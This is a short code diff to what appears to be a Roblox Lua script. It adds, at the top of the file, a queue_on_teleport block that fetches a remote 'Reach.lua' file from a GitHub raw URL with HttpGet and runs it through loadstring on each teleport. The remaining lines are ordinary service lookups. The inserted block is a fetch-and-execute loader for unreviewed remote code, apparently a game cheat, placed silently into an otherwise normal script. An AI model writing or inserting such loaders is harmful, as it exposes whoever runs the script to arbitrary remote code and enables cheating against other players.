@@ -1,3 +1,8 @@
+if type(queue_on_teleport) == "function" then
+    queue_on_teleport([[
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/HiddenUserAnomaly/Hidden/main/Reach.lua"))()
+    ]])
+end
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
